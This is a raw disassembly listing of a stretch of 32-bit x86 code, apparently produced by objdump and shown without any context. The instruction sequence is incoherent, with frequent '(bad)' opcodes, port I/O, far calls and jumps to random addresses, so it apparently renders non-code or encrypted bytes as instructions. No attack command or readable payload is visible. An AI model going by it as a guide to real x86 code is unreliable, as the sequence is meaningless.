  40a735:	dec    ebx
  40a736:	pop    edx
  40a737:	loope  0x40a76a
  40a739:	xor    BYTE PTR [esp+ecx*1],0x21
  40a73d:	mov    ebp,0x822995b0
  40a742:	int    0x36
  40a744:	and    esp,DWORD PTR [ecx]
  40a746:	imul   eax,DWORD PTR ds:0x3fef05df,0x15
  40a74d:	test   al,0x1
  40a74f:	jns    0x40a7c6
  40a751:	popf   
  40a752:	ficomp DWORD PTR [edx+0x3b]
  40a755:	dec    eax
  40a756:	adc    eax,DWORD PTR [esi-0x7f1512c3]
  40a75c:	push   esp
  40a75d:	or     BYTE PTR [edx-0x4074caf7],dh
  40a763:	enter  0xcb17,0x3b
  40a767:	push   ds
  40a768:	test   eax,0xfaec8e48
  40a76d:	test   ah,dl
  40a76f:	ds popf 
  40a771:	in     al,dx
  40a772:	arpl   WORD PTR [eax],sp
  40a774:	lods   eax,DWORD PTR ds:[esi]
  40a775:	aad    0xd1
  40a777:	push   esi
  40a778:	jb     0x40a751
  40a77a:	push   ebx
  40a77b:	scas   eax,DWORD PTR es:[edi]
  40a77c:	cmp    edx,DWORD PTR [esp+edi*2-0x6453458]
  40a783:	jl     0x40a793
  40a785:	cdq    
  40a786:	push   cs
  40a787:	xchg   esp,eax
  40a788:	(bad)  
  40a789:	in     al,0xbc
  40a78b:	fcom   DWORD PTR [esi+0x7d]
  40a78e:	cmp    DWORD PTR [ecx+0x6c0e30f8],edx
  40a794:	(bad)  
  40a795:	js     0x40a7ed
  40a797:	sbb    DWORD PTR es:[edx+ebx*1],0x2c618ade
  40a79f:	push   0xffffffcc
  40a7a1:	dec    ebx
  40a7a2:	into   
  40a7a3:	scas   al,BYTE PTR es:[edi]
  40a7a4:	repz imul ecx,DWORD PTR [ebx-0x5],0xffffff92
  40a7a9:	jbe    0x40a756
  40a7ab:	aaa    
  40a7ac:	cli    
  40a7ad:	push   ebp
  40a7ae:	dec    ecx
  40a7af:	jno    0x40a815
  40a7b1:	dec    edi
  40a7b2:	cmp    BYTE PTR ds:0x7c74a9df,cl
  40a7b8:	mov    esp,DWORD PTR [ebp-0x13]
  40a7bb:	add    ebx,DWORD PTR [ebx-0x4e]
  40a7be:	in     al,0x5b
  40a7c0:	sub    DWORD PTR [eax],edx
  40a7c2:	lahf   
  40a7c3:	daa    
  40a7c4:	jl     0x40a7eb
  40a7c6:	shr    DWORD PTR [ebp+0x36dddc4c],0x27
  40a7cd:	pushf  
  40a7ce:	mov    bl,0x74
  40a7d0:	xor    edi,DWORD PTR [edi+eax*8+0x36c44dca]
  40a7d7:	mov    ecx,0x39653e40
  40a7dc:	jb     0x40a7f8
  40a7de:	cli    
  40a7df:	cs cmp al,0x4
  40a7e2:	loop   0x40a862
  40a7e4:	fcmovnbe st,st(6)
  40a7e6:	xor    al,0x8
  40a7e8:	in     eax,dx
  40a7e9:	or     al,0x7
  40a7eb:	sbb    al,0x21
  40a7ed:	call   0x62ef:0x6acc19db
  40a7f4:	icebp  
  40a7f5:	iret   
  40a7f6:	jg     0x40a83b
  40a7f8:	cmp    al,0x56
  40a7fa:	and    ecx,ecx
  40a7fc:	int    0xe1
  40a7fe:	mov    ebp,0xdcd2ae0
  40a803:	test   al,0xc0
  40a805:	mov    al,0x73
  40a807:	data16 loopne 0x40a888
  40a80a:	(bad)  
  40a80b:	fimul  DWORD PTR [ebp-0x2c]
  40a80e:	push   cs
  40a80f:	test   ebx,esp
  40a811:	(bad)  
  40a812:	adc    eax,0xb6bc8cb5
  40a817:	push   cs
  40a818:	lock in eax,dx
  40a81a:	push   es
  40a81b:	or     DWORD PTR [esi+0x38],0xfffffff4
  40a81f:	outs   dx,BYTE PTR ds:[esi]
  40a820:	loope  0x40a7e9
  40a822:	inc    edx
  40a823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a824:	fadd   DWORD PTR [eax]
  40a826:	sub    eax,0x537ba743
  40a82b:	mov    bl,0xba
  40a82d:	es push cs
  40a82f:	retf   
  40a830:	jp     0x40a85f
  40a832:	inc    esp
  40a833:	jecxz  0x40a870
  40a835:	cmp    DWORD PTR ds:0x77a11aef,edx
  40a83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a83c:	pop    ecx
  40a83d:	xlat   BYTE PTR ds:[ebx]
  40a83e:	sub    cl,BYTE PTR [esi+0x1d99ac9e]
  40a844:	or     DWORD PTR [edx],edx
  40a846:	mov    cl,0x43
  40a848:	or     DWORD PTR [ebx-0x33],ecx
  40a84b:	xlat   BYTE PTR ds:[ebx]
  40a84c:	pop    ebx
  40a84d:	cmp    al,0x2f
  40a84f:	int    0xb9
  40a851:	(bad)  
  40a852:	xchg   esi,eax
  40a853:	cmp    al,0xba
  40a855:	sahf   
  40a856:	add    al,0x8
  40a858:	imul   edx,DWORD PTR [edx-0x9ec2a7a],0x9688708f
  40a862:	sbb    eax,0x51c3482b
  40a867:	push   eax
  40a868:	mov    ecx,0xdf053e32
  40a86d:	and    al,0xb2
  40a86f:	and    eax,0x910d17c9
  40a874:	inc    ecx
  40a875:	aam    0xd8
  40a877:	xor    ebp,DWORD PTR [edx+edi*4+0x7324f719]
  40a87e:	push   esp
  40a87f:	aam    0x76
  40a881:	shl    BYTE PTR [edx],1
  40a883:	loope  0x40a8e1
  40a885:	add    BYTE PTR [edx],ah
  40a887:	xlat   BYTE PTR ds:[ebx]
  40a888:	dec    ecx
  40a889:	ja     0x40a8f8
  40a88b:	mov    al,0xb2
  40a88d:	(bad)  
  40a88e:	call   0x6926:0x13489f50
  40a895:	push   ds
  40a896:	jo     0x40a89d
  40a898:	sbb    edi,esp
  40a89a:	pop    ebp
  40a89b:	pop    esi
  40a89c:	mov    al,ds:0x2ea0a169
  40a8a1:	sar    BYTE PTR [edi+esi*2+0x7bcf4a7a],1
  40a8a8:	lock int3 
  40a8aa:	xchg   esp,eax
  40a8ab:	lock adc ah,dl
  40a8ae:	ds sbb al,0xf2
  40a8b1:	aam    0xef
  40a8b3:	ins    BYTE PTR es:[edi],dx
  40a8b4:	mov    dh,0xb2
  40a8b6:	hlt    
  40a8b7:	push   edi
  40a8b8:	jp     0x40a936
  40a8ba:	xchg   esp,eax
  40a8bb:	int    0x9e
  40a8bd:	ret    0xbdb1
  40a8c0:	and    dh,BYTE PTR [ebp+0x64861d21]
  40a8c6:	cmovge ecx,DWORD PTR [edx+0x36]
  40a8ca:	inc    ecx
  40a8cb:	mov    bh,0xe7
  40a8cd:	call   0x1264:0xe04d12e5
  40a8d4:	out    0x45,al
  40a8d6:	add    BYTE PTR [ecx+ebp*4-0x65],bh
  40a8da:	leave  
  40a8db:	push   es
  40a8dc:	pop    ebx
  40a8dd:	fnsave [edx-0x61235f61]
  40a8e3:	rol    DWORD PTR [ebx],0xc6
  40a8e6:	je     0x40a8c3
  40a8e8:	call   0x1a27:0xec8af425
  40a8ef:	ss lahf 
  40a8f1:	stc    
  40a8f2:	stc    
  40a8f3:	mov    eax,ds:0x6f3156e4
  40a8f8:	inc    ebx
  40a8f9:	xchg   edx,eax
  40a8fa:	mov    eax,0xac481d96
  40a8ff:	stos   BYTE PTR es:[edi],al
  40a900:	mov    ecx,0xdba0fd82
  40a905:	outs   dx,DWORD PTR ds:[esi]
  40a906:	dec    edi
  40a907:	mov    ch,0xbd
  40a909:	and    ah,BYTE PTR [esi+0x4ff74645]
  40a90f:	inc    esi
  40a910:	xor    DWORD PTR [ecx],eax
  40a912:	pop    ebx
  40a913:	sub    BYTE PTR [ecx+0x31],dl
  40a916:	out    0x7f,al
  40a918:	pushf  
  40a919:	push   ebx
  40a91a:	sub    eax,0xdd4aef0e
  40a91f:	int    0x46
  40a921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a922:	mov    bl,0xed
  40a924:	cmp    DWORD PTR [ecx+ebp*2+0x514e477c],eax
  40a92b:	pop    esi
  40a92c:	popf   
  40a92d:	mov    bh,0xc4
  40a92f:	cmp    ah,0xbd
  40a932:	cmp    ah,BYTE PTR [bx+di-0x6a93]
  40a937:	jae    0x40a976
  40a939:	outs   dx,BYTE PTR ds:[esi]
  40a93a:	inc    ebp
  40a93b:	jmp    0xf8fc3dd6
  40a940:	dec    eax
  40a941:	adc    al,0xf7
  40a943:	jle    0x40a905
  40a945:	pop    es
  40a946:	loop   0x40a980
  40a948:	cmp    al,ah
  40a94a:	or     BYTE PTR [ecx-0x77],dl
  40a94d:	dec    ebp
  40a94e:	ins    DWORD PTR es:[edi],dx
  40a94f:	mov    ch,0x13
  40a952:	mov    bl,0x52
  40a954:	icebp  
  40a955:	nop
  40a956:	cli    
  40a957:	push   edi
  40a958:	xor    eax,0xc5c35075
  40a95d:	test   DWORD PTR [esi-0x5270d1af],0x9a7f4c67
  40a967:	mov    ebx,0xc1f8a1ef
  40a96c:	jecxz  0x40a9d9
  40a96e:	xchg   edi,eax
  40a96f:	mov    esp,eax
  40a971:	inc    eax
  40a972:	aaa    
  40a973:	push   eax
  40a974:	enter  0xf1e5,0xad
  40a978:	push   es
  40a979:	xchg   esp,eax
  40a97a:	mov    ch,ch
  40a97c:	outs   dx,BYTE PTR ds:[esi]
  40a97d:	mov    cl,0xd9
  40a97f:	cli    
  40a980:	adc    BYTE PTR [eax+ebx*8+0x248c4722],0xff
  40a988:	xchg   esp,eax
  40a989:	and    BYTE PTR [esi+edx*4],bl
  40a98c:	add    BYTE PTR [eax],al
  40a98e:	xchg   ebx,eax
  40a98f:	mov    dl,0x38
  40a991:	les    ebx,FWORD PTR [esi]
  40a993:	push   esi
  40a994:	mov    ecx,DWORD PTR [esi]
  40a996:	data16 fldcw WORD PTR [edi-0xc]
  40a99a:	sahf   
  40a99b:	mov    ds:0xac688895,al
  40a9a0:	and    DWORD PTR [esi+0x3b],ebx
  40a9a3:	push   ss
  40a9a4:	push   0x35
  40a9a6:	adc    BYTE PTR [eax-0xcd32f72],ch
  40a9ac:	fdiv   DWORD PTR [ecx+0x414830bc]
  40a9b2:	cmp    al,al
  40a9b4:	(bad)  
  40a9b5:	and    ah,dh
  40a9b7:	call   0x6c01:0x7cb5af75
  40a9be:	in     eax,0x36
  40a9c0:	sbb    esp,DWORD PTR [ebp+0x2e]
  40a9c3:	cmp    BYTE PTR [edx+ecx*1-0x4b],0x0
  40a9c8:	push   ebp
  40a9c9:	add    cl,bh
  40a9cb:	repz add DWORD PTR [esi+0x7c477047],edx
  40a9d2:	das    
  40a9d3:	cmp    BYTE PTR [bx+0xa],dl
  40a9d7:	and    BYTE PTR [esi],cl
  40a9d9:	push   cs
  40a9da:	cmp    al,0x84
  40a9dc:	lods   al,BYTE PTR ds:[esi]
  40a9dd:	or     ch,al
  40a9df:	jo     0x40a981
  40a9e1:	or     eax,0x18c54e54
  40a9e6:	inc    ecx
  40a9e7:	mov    dh,dh
  40a9e9:	loope  0x40a97e
  40a9eb:	inc    ebx
  40a9ec:	push   edx
  40a9ed:	and    BYTE PTR [edx],dh
  40a9ef:	test   eax,0x5ff98988
  40a9f4:	shl    BYTE PTR [edx-0x68eeec15],0x14
  40a9fb:	push   0x81e2f889
  40aa00:	inc    esi
  40aa01:	push   0xffffffc7
  40aa03:	sbb    DWORD PTR [edi-0x272ce023],ecx
  40aa09:	xor    al,0x3e
  40aa0b:	jge    0x40aa71
  40aa0d:	or     DWORD PTR [ebp-0x31026717],0x5
  40aa14:	sub    esi,ebx
  40aa16:	jb     0x40a9a2
  40aa18:	pop    esp
  40aa19:	out    dx,eax
  40aa1a:	icebp  
  40aa1b:	xchg   ebp,eax
  40aa1c:	mov    ch,0xc4
  40aa1e:	stc    
  40aa1f:	hlt    
  40aa20:	cwde   
  40aa21:	jne    0x40a9f3
  40aa23:	inc    eax
  40aa24:	inc    DWORD PTR [edi]
  40aa26:	sub    eax,0x43b9e344
  40aa2b:	imul   ebx,DWORD PTR [ecx],0x34
  40aa2e:	lahf   
  40aa2f:	dec    esp
  40aa30:	xchg   ebp,eax
  40aa31:	ins    DWORD PTR es:[edi],dx
  40aa32:	imul   edi,DWORD PTR [esi+0x33],0x4d
  40aa36:	sub    BYTE PTR [esi-0x56],0xeb
  40aa3a:	cmp    BYTE PTR [ebp+0x20e38325],dh
  40aa40:	cmp    dl,BYTE PTR [edi]
  40aa42:	pop    ss
  40aa43:	push   esi
  40aa44:	aad    0x44
  40aa46:	jne    0x40a9f5
  40aa48:	push   ss
  40aa49:	push   ebp
  40aa4a:	cmp    BYTE PTR [eax-0x7bf4442d],0x63
  40aa51:	in     al,0xc0
  40aa53:	mov    ch,BYTE PTR [ebp+eax*4-0x169741a9]
  40aa5a:	inc    edi
  40aa5b:	test   DWORD PTR [eax-0x67],ecx
  40aa5e:	mov    dh,0x33
  40aa60:	jno    0x40aa69
  40aa62:	xchg   ebx,eax
  40aa63:	lea    ebx,[ecx+0x42]
  40aa66:	outs   dx,BYTE PTR ds:[esi]
  40aa67:	push   cs
  40aa68:	dec    eax
  40aa69:	out    dx,eax
  40aa6a:	cld    
  40aa6b:	xor    ebp,esp
  40aa6d:	outs   dx,DWORD PTR ds:[esi]
  40aa6e:	cmp    eax,0xb5275427
  40aa73:	sbb    WORD PTR [edi-0x3588ee],cx
  40aa7a:	int3   
  40aa7b:	or     edx,DWORD PTR gs:[edx+0x52]
  40aa7f:	dec    esp
  40aa80:	push   esi
  40aa81:	cs pop esi
  40aa83:	dec    eax
  40aa84:	mov    WORD PTR [ebp+0x644afe0b],?
  40aa8a:	pushf  
  40aa8b:	or     al,BYTE PTR [eax+edi*2]
  40aa8e:	aad    0x81
  40aa90:	xchg   al,ch
  40aa92:	pop    ss
  40aa93:	add    BYTE PTR ds:0xea62e085,ah
  40aa99:	mov    al,0x34
  40aa9b:	(bad)  
  40aa9c:	push   ebp
  40aa9d:	test   BYTE PTR [ebx],dl
  40aa9f:	cmc    
  40aaa0:	xlat   BYTE PTR ds:[ebx]
  40aaa1:	adc    eax,ecx
  40aaa3:	push   eax
  40aaa4:	fist   WORD PTR [ecx-0x4dd82e18]
  40aaaa:	mov    eax,0x843883f8
  40aaaf:	adc    ebp,DWORD PTR [eax+0x76fc4e35]
  40aab5:	fcomp  QWORD PTR [ebx+0x755fc3af]
  40aabb:	add    dh,BYTE PTR [eax-0x53]
  40aabe:	jmp    0x40aadd
  40aac0:	or     al,0x4c
  40aac2:	push   edi
  40aac3:	aaa    
  40aac4:	fsub   st(6),st
  40aac6:	in     eax,0x4a
  40aac8:	cmc    
  40aac9:	cdq    
  40aaca:	jb     0x40aa7c
  40aacc:	adc    al,0x63
  40aace:	test   BYTE PTR [eax+0x4be5fdfd],bh
  40aad4:	or     bl,BYTE PTR [ebp+0x36]
  40aad7:	or     eax,0xc5cc6f05
  40aadc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aadd:	pop    edx
  40aade:	xor    ebx,edx
  40aae0:	dec    ebp
  40aae1:	xor    al,BYTE PTR [esp+eax*1]
  40aae4:	mov    bh,al
  40aae6:	xchg   esi,eax
  40aae7:	scas   al,BYTE PTR es:[edi]
  40aae8:	or     BYTE PTR [ebx-0x62],al
  40aaeb:	das    
  40aaec:	xor    dl,BYTE PTR [ecx+0x4]
  40aaef:	inc    edx
  40aaf0:	fadd   DWORD PTR [edx+0x34d91bf0]
  40aaf6:	adc    DWORD PTR [edx],ecx
  40aaf8:	iret   
  40aaf9:	sub    esp,eax
  40aafb:	retf   0xc162
  40aafe:	std    
  40aaff:	das    
  40ab00:	inc    esi
  40ab01:	dec    ebp
  40ab02:	inc    edx
  40ab03:	or     ah,dl
  40ab05:	push   ss
  40ab06:	xor    al,0x91
  40ab08:	inc    ebx
  40ab09:	imul   edx,DWORD PTR [eax+0x3d61ea78],0xffffffce
  40ab10:	idiv   DWORD PTR [edi+eiz*4-0x651db512]
  40ab17:	mov    ch,0x28
  40ab19:	lea    edi,[ebx-0x53f43fc4]
  40ab1f:	outs   dx,DWORD PTR ds:[esi]
  40ab20:	int3   
  40ab21:	pop    edi
  40ab22:	popa   
  40ab23:	in     al,0x9a
  40ab25:	cmp    esp,eax
  40ab27:	sar    BYTE PTR [ebx+0x4c],cl
  40ab2a:	mov    bl,0x74
  40ab2c:	jb     0x40ab0f
  40ab2e:	or     BYTE PTR [ecx],cl
  40ab30:	popa   
  40ab31:	aam    0x23
  40ab33:	xchg   edi,eax
  40ab34:	sbb    eax,0x851ac7eb
  40ab39:	sbb    ebx,DWORD PTR [edx-0x26]
  40ab3c:	dec    esp
  40ab3d:	pop    edx
  40ab3e:	sahf   
  40ab3f:	adc    al,0xb7
  40ab41:	mov    ecx,DWORD PTR [edx+edi*1+0x47f26af]
  40ab48:	jne    0x40ab49
  40ab4a:	sbb    cl,dl
  40ab4c:	loopne 0x40aadc
  40ab4e:	xor    al,0x2f
  40ab50:	fist   WORD PTR [ebp+0x5c449f65]
  40ab56:	rcl    DWORD PTR [ecx+0x66777275],cl
  40ab5c:	and    DWORD PTR [esi],ebp
  40ab5e:	js     0x40ab13
  40ab60:	fstp   QWORD PTR [edi]
  40ab62:	hlt    
  40ab63:	nop
  40ab64:	out    0x9a,al
  40ab66:	pop    ecx
  40ab67:	icebp  
  40ab68:	xchg   ecx,eax
  40ab69:	pop    esi
  40ab6a:	rol    BYTE PTR [edi-0x511cf21c],1
  40ab70:	sbb    esp,DWORD PTR [ebx]
  40ab72:	jbe    0x40abee
  40ab74:	(bad)  
  40ab75:	bnd ret 
  40ab77:	sbb    BYTE PTR [ecx-0x74de0a9],bh
  40ab7d:	aas    
  40ab7e:	add    BYTE PTR [edx],al
  40ab80:	popa   
  40ab81:	xlat   BYTE PTR ds:[ebx]
  40ab82:	in     eax,0xf1
  40ab84:	lods   al,BYTE PTR ds:[esi]
  40ab85:	test   BYTE PTR [edx],0xa3
  40ab88:	and    ch,dl
  40ab8a:	push   edi
  40ab8b:	mov    cl,0xf0
  40ab8d:	retf   0xa11d
  40ab90:	mov    bl,0x4c
  40ab92:	ret    
  40ab93:	inc    esi
  40ab94:	aas    
  40ab95:	push   0x5
  40ab97:	aaa    
  40ab98:	pop    ebp
  40ab99:	cld    
  40ab9a:	adc    ebx,edx
  40ab9c:	call   0xd964:0x259a612b
  40aba3:	retf   0x720c
  40aba6:	dec    DWORD PTR [ebx-0x78b98bdc]
  40abac:	push   ds
  40abad:	aas    
  40abae:	rcr    BYTE PTR [edx-0x7],1
  40abb1:	sub    BYTE PTR [eax-0x455bd0be],dh
  40abb7:	int3   
  40abb8:	rcr    BYTE PTR ds:0x8572916c,0x59
  40abbf:	mov    esp,0x2e953613
  40abc4:	jl     0x40aba2
  40abc6:	in     eax,dx
  40abc7:	(bad)  
  40abc8:	std    
  40abc9:	mov    dl,0x81
  40abcb:	test   BYTE PTR [ecx+0x1adaeba0],cl
  40abd1:	popf   
  40abd2:	std    
  40abd3:	mov    al,0xbd
  40abd5:	(bad)  
  40abd6:	retf   
  40abd7:	out    dx,eax
  40abd8:	call   0xf3f7aafd
  40abdd:	mov    WORD PTR [ecx],fs
  40abdf:	ins    DWORD PTR es:[edi],dx
  40abe0:	mov    edi,0xf0352fc8
  40abe5:	and    eax,0xbe152b1b
  40abea:	xor    bl,BYTE PTR [ebx]
  40abec:	icebp  
  40abed:	adc    al,0xc4
  40abef:	dec    ebp
  40abf0:	jg     0x40abdb
  40abf2:	and    bh,cl
  40abf4:	xchg   esp,eax
  40abf5:	stc    
  40abf6:	jne    0x40abb2
  40abf8:	dec    edx
  40abf9:	add    bl,BYTE PTR [edx+0x49174432]
  40abff:	hlt    
  40ac00:	shr    BYTE PTR [ecx-0x65],1
  40ac03:	jg     0x40ac3a
  40ac05:	or     al,BYTE PTR [edx-0x119f857]
  40ac0b:	and    BYTE PTR [eax+0x33093539],cl
  40ac11:	inc    ebx
  40ac12:	ins    DWORD PTR es:[edi],dx
  40ac13:	and    al,0x4
  40ac15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac16:	inc    ecx
  40ac17:	hlt    
  40ac18:	xor    al,0xc5
  40ac1a:	bnd jnp 0x40aba6
  40ac1d:	mov    BYTE PTR [eax],ah
  40ac1f:	push   esp
  40ac20:	mov    esp,eax
  40ac22:	cld    
  40ac23:	fcomi  st,st(1)
  40ac25:	sti    
  40ac26:	cmp    eax,0x4770bd34
  40ac2b:	cmp    esp,DWORD PTR [ebx+0x15079cd9]
  40ac31:	add    DWORD PTR [eax+edi*4-0x509d8fd0],ecx
  40ac38:	add    al,0x23
  40ac3a:	test   bh,bl
  40ac3c:	loope  0x40acbb
  40ac3e:	xor    BYTE PTR [ebx],cl
  40ac40:	adc    DWORD PTR [ebx],ebp
  40ac42:	lods   eax,DWORD PTR ds:[esi]
  40ac43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac44:	lods   al,BYTE PTR ds:[esi]
  40ac45:	jge    0x40ac39
  40ac47:	in     al,0xb9
  40ac49:	scas   eax,DWORD PTR es:[edi]
  40ac4a:	inc    esi
  40ac4b:	push   esi
  40ac4c:	or     DWORD PTR [edx+0x748bed5d],esi
  40ac52:	push   edi
  40ac53:	scas   al,BYTE PTR es:[edi]
  40ac54:	(bad)  
  40ac55:	mov    eax,0x31fa6f2d
  40ac5a:	push   esp
  40ac5b:	stc    
  40ac5c:	pop    edi
  40ac5d:	pusha  
  40ac5e:	les    esi,FWORD PTR [edx+0x2fadcd98]
  40ac64:	mov    al,ds:0x13c6d95a
  40ac69:	jl     0x40ac38
  40ac6b:	jle    0x40ac5a
  40ac6d:	outs   dx,DWORD PTR ds:[esi]
  40ac6e:	mov    dh,0xff
  40ac70:	xchg   edi,eax
  40ac71:	jmp    0x7d820aa8
  40ac76:	inc    eax
  40ac77:	sub    al,al
  40ac79:	ja     0x40ac1e
  40ac7b:	jmp    0xd840a45d
  40ac80:	dec    ebp
  40ac81:	or     eax,0x3a61aa2e
  40ac86:	inc    ebp
  40ac87:	fwait
  40ac88:	popa   
  40ac89:	ja     0x40ac42
  40ac8b:	xchg   BYTE PTR [esi+0x30],bl
  40ac8e:	push   cs
  40ac8f:	test   DWORD PTR [esi+0x32],0x7c5e3b29
  40ac96:	add    al,0xde
  40ac98:	dec    esi
  40ac99:	sti    
  40ac9a:	js     0x40ac29
  40ac9c:	mov    BYTE PTR [ebx-0x1],0xb
  40aca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aca1:	xchg   BYTE PTR [ebx+0x17],al
  40aca4:	mov    ds:0x46e5f227,al
  40aca9:	or     dh,BYTE PTR [ebx-0x5d41b83b]
  40acaf:	xor    al,0x83
  40acb1:	xchg   esp,eax
  40acb2:	push   eax
  40acb3:	in     eax,0x4a
  40acb5:	repnz mov esp,0x197b7ed1
  40acbb:	sbb    cl,BYTE PTR [esi+eax*2-0x29fadc47]
  40acc2:	push   esp
  40acc3:	jecxz  0x40acdd
  40acc5:	cmp    ecx,DWORD PTR [esi*1-0x56ce8685]
  40accc:	pop    DWORD PTR fs:[esi+0x5080d8ab]
  40acd3:	mov    bh,0x3
  40acd5:	add    eax,0xf7d0ba57
  40acda:	xchg   esp,eax
  40acdb:	sbb    eax,0x93b82e8a
  40ace0:	mov    BYTE PTR [ebx-0x37],ah
  40ace3:	stos   DWORD PTR es:[edi],eax
  40ace4:	clc    
  40ace5:	adc    edx,DWORD PTR [esi-0x7c]
  40ace8:	ja     0x40ac87
  40acea:	add    ecx,DWORD PTR [ecx]
  40acec:	sub    DWORD PTR [edx-0x9],esp
  40acef:	mov    edi,eax
  40acf1:	push   cs
  40acf2:	nop
  40acf3:	and    eax,0xbd8c7de6
  40acf8:	mov    eax,0xd860740a
  40acfd:	xchg   edi,eax
  40acfe:	lds    esp,FWORD PTR [ecx+0xf67c061]
  40ad04:	jno    0x40ac92
  40ad06:	add    BYTE PTR [ecx],ah
  40ad08:	bound  esp,QWORD PTR [edi+0x7e347186]
  40ad0e:	sbb    edi,DWORD PTR [ebx-0x6270a80d]
  40ad14:	fldcw  WORD PTR [eax+0x2d7cdb6f]
  40ad1a:	mov    ds,WORD PTR [esi]
  40ad1c:	xor    BYTE PTR [edx+0x2f],ah
  40ad1f:	xor    eax,edx
  40ad21:	mov    eax,0x4a9beefb
  40ad26:	sbb    esi,DWORD PTR [ebx-0x39]
  40ad29:	push   es
  40ad2a:	mov    ebp,0x5af21958
  40ad2f:	fsub   DWORD PTR [edi-0x1f5d7175]
  40ad35:	dec    esi
  40ad36:	add    eax,0x5e4d14a6
  40ad3b:	test   DWORD PTR [eax-0x71],esp
  40ad3e:	add    al,0xdb
  40ad40:	sub    dl,BYTE PTR [ebp+0x5de3af4c]
  40ad46:	mov    eax,0xf972c3aa
  40ad4b:	xor    dl,ah
  40ad4d:	push   es
  40ad4e:	push   edx
  40ad4f:	sar    DWORD PTR [ebx+0xa],0x6c
  40ad53:	js     0x40ad85
  40ad55:	cld    
  40ad56:	or     DWORD PTR [esi],esi
  40ad58:	lods   al,BYTE PTR ds:[esi]
  40ad59:	push   eax
  40ad5a:	loope  0x40ace9
  40ad5c:	jae    0x40ad31
  40ad5e:	mov    edx,0x5c0af6b7
  40ad63:	xor    DWORD PTR [ecx-0x1e71c350],ebx
  40ad69:	(bad)  
  40ad6a:	cmc    
  40ad6b:	mov    ds:0x825849c7,eax
  40ad70:	mov    cl,0xcc
  40ad72:	adc    ebp,eax
  40ad74:	mov    WORD PTR [esi],ds
  40ad76:	fnstsw WORD PTR [edi-0x27]
  40ad79:	(bad)  
  40ad7a:	ror    BYTE PTR [esi],0xbe
  40ad7d:	lahf   
  40ad7e:	cmc    
  40ad7f:	shr    DWORD PTR [eax],0xf2
  40ad82:	add    esp,DWORD PTR [eax-0x481a3c72]
  40ad88:	enter  0xa91c,0xd1
  40ad8c:	jle    0x40ad64
  40ad8e:	addr16 gs jl 0x40adb9
  40ad92:	mov    ds:0x64e29924,eax
  40ad97:	mov    esp,0xff0b9efb
  40ad9c:	sbb    DWORD PTR [ecx-0x6a],ebp
  40ad9f:	lods   al,BYTE PTR ds:[esi]
  40ada0:	or     al,0x49
  40ada2:	jo     0x40adea
  40ada4:	js     0x40ad91
  40ada6:	ins    DWORD PTR es:[edi],dx
  40ada7:	and    BYTE PTR [ecx+0x60daa71c],bh
  40adad:	ss out dx,eax
  40adaf:	adc    DWORD PTR [ebx],esp
  40adb1:	push   esi
  40adb2:	push   edx
  40adb3:	call   0xa79e:0x9639af96
  40adba:	sbb    BYTE PTR [eax+0xa],bh
  40adbd:	xor    BYTE PTR [eax+0x30],dl
  40adc0:	push   es
  40adc1:	xor    ah,BYTE PTR [ebx+eax*2]
  40adc4:	adc    eax,0x742335c3
  40adc9:	scas   al,BYTE PTR es:[edi]
  40adca:	out    0xe0,al
  40adcc:	sbb    bh,BYTE PTR [esi+0x5bf059ea]
  40add2:	or     al,BYTE PTR [ebx]
  40add4:	dec    esp
  40add5:	or     esp,DWORD PTR [edi-0x13]
  40add8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add9:	es pop ebx
  40addb:	cwde   
  40addc:	push   edi
  40addd:	mov    ebp,0x80f65756
  40ade2:	inc    ebp
  40ade3:	repz xchg esi,eax
  40ade5:	sub    esp,DWORD PTR [eax+edx*8-0x91e1d2c]
  40adec:	add    BYTE PTR [ebp+0x276e8f78],ch
  40adf2:	and    BYTE PTR [edx-0x71],bl
  40adf5:	adc    al,0x48
  40adf8:	out    0xf5,al
  40adfa:	xchg   edi,eax
  40adfb:	push   ss
  40adfc:	xor    BYTE PTR [ebx],dl
  40adfe:	sub    BYTE PTR [edx-0x18fcebb0],bh
  40ae04:	push   edx
  40ae05:	hlt    
  40ae06:	mov    bl,0x57
  40ae08:	popa   
  40ae09:	mov    esp,0xfba80974
  40ae0e:	lods   al,BYTE PTR ds:[esi]
  40ae0f:	test   DWORD PTR [edi+ebx*8+0x62],ebp
  40ae13:	add    BYTE PTR [eax+0x2e],dl
  40ae16:	loop   0x40adf8
  40ae18:	jle    0x40ae0a
  40ae1a:	xor    ah,BYTE PTR [eax-0x3e]
  40ae1d:	aaa    
  40ae1e:	xor    DWORD PTR [ebx-0x2e5651f1],esp
  40ae24:	adc    al,0xc5
  40ae26:	mov    ss,WORD PTR [eax+edi*4-0x40]
  40ae2a:	sub    eax,edx
  40ae2c:	mov    al,ds:0x4c12c4ac
  40ae31:	aad    0x31
  40ae33:	mov    dh,0x0
  40ae35:	mov    dl,BYTE PTR [edi-0x6eb75017]
  40ae3b:	lock (bad) 
  40ae3d:	cdq    
  40ae3e:	pop    ebp
  40ae3f:	mov    bh,0xd4
  40ae41:	push   ss
  40ae42:	mov    dl,0x36
  40ae44:	pop    edx
  40ae45:	jecxz  0x40ae9c
  40ae47:	sbb    al,0xc5
  40ae49:	loopne 0x40ae92
  40ae4b:	inc    edi
  40ae4c:	adc    ebp,DWORD PTR [edx]
  40ae4e:	(bad)  
  40ae4f:	sti    
  40ae50:	xchg   edx,eax
  40ae51:	sahf   
  40ae52:	sbb    DWORD PTR [edi+0xb],0x67e9a8a0
  40ae59:	adc    eax,0x11311129
  40ae5e:	pusha  
  40ae5f:	mov    dl,0x30
  40ae61:	jne    0x40aecc
  40ae63:	(bad)  
  40ae64:	cmp    dl,BYTE PTR [esi+0x2b]
  40ae67:	lea    edx,[ebx-0x60b36f64]
  40ae6d:	dec    ebp
  40ae6e:	sbb    eax,0x64fca6a2
  40ae73:	push   esp
  40ae74:	repnz or dh,ah
  40ae77:	pop    eax
  40ae78:	test   eax,0x387b12db
  40ae7d:	jb     0x40ae0c
  40ae7f:	out    0x55,eax
  40ae81:	jne    0x40ae7e
  40ae83:	fst    DWORD PTR [ebp-0x4cd38a91]
  40ae89:	jl     0x40ae90
  40ae8b:	int3   
